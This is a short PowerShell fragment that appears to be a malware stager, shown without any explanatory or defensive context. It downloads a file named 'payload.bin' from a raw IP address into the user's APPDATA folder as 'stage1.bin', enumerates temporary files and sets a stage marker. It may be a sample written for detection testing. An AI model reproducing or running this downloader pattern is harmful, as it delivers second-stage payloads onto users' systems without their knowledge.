$Stage2Url = 'http://203.0.113.77/payload.bin'
$Stage2Path = "$env:APPDATA\stage1.bin"
(New-Object System.Net.WebClient).DownloadFile($Stage2Url, $Stage2Path)
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
$StageMarker = "stage-16"
